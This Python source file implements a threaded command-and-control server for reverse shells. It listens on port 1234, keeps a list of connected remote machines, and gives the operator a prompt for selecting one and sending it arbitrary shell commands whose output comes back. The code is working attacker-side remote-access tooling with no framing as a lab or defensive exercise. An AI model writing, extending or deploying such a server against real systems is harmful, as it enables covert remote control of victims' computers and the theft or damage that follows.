# will be run in the server which has a static IP
import socket
import sys
import threading
import queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = queue.Queue()
all_connections = []
all_address = []

def create_socket():
    try:
        global serverIP
        global portNo
        global s
        serverIP = ""
        portNo = 1234
        print("Creating socket: "+serverIP+":"+str(portNo))
        s = socket.socket()
    except socket.error as err:
        print("Error while creating socket: "+str(err))

def bind_socket():
    try:
        global serverIP
        global portNo
        global s
        print("Binding socket...")
        s.bind((serverIP, portNo))
        s.listen(5)

    except socket.error as err:
        print("Error while binding socket: "+str(err))

def accepting_connection():
    # close if any open connection
    for conn in all_connections:
        conn.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, addr = s.accept()
            s.setblocking(1) # to avoid timeout

            all_address.append(addr)
            all_connections.append(conn)

            print("Connection established with: "+str(addr))
        except socket.error as err:
            print("Error making connection: "+str(err))

def customShell():
    while True:
        cmd = input(">> ")

        if cmd == "list":
            list_connections()
        
        elif "select" in cmd:
            conn = get_conn(cmd)
            if conn is not None:
                send_commands(conn)
        else:
            print("Unrecognized command!")

def list_connections():
    print("-----CONNECTIONS-----")
    print("ID        IP        PORT")
    for idx, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(20480)
        except:
            del all_address[:]
            del all_connections[:]
            continue

        result = str(idx) + "  " + str(all_address[idx][0]) + "  " + str(all_address[idx][1])
        print(result)

def get_conn(cmd):
    try:
        conNo = int(cmd.replace("select ", ""))
        conn = all_connections[conNo]
        # print("Connecting to: "+str(conn[0]))
        return conn
    except socket.error as err:
        print("Invalid selection: "+str(err))
        return None

def send_commands(conn):
    try:
        while True:
            currPath = str(conn.recv(1024), "utf-8")
            print(currPath, end="")
            cmd = input()
            if cmd == "exit":
                conn.close()
                sys.exit()
            elif len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                resp = str(conn.recv(20480), "utf-8")
                if resp == "no-output":
                    resp = ""
                print(resp)
            conn.send(str.encode("next"))
    except socket.error as err:
        print("Error sending commands: "+str(err))

# create worker threads
def create_workers():
    for _ in JOB_NUMBER:
        t = threading.Thread(target=work)
        t.daemon = True # stops the thread after the task running in it ends.
        t.start()

def work():
    while True:
        x = queue.get()
        if x==1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x==2:
            customShell()
    
        queue.task_done()

def create_jobs():
    for jobNo in JOB_NUMBER:
        queue.put(jobNo)

    queue.join()

create_workers()
create_jobs()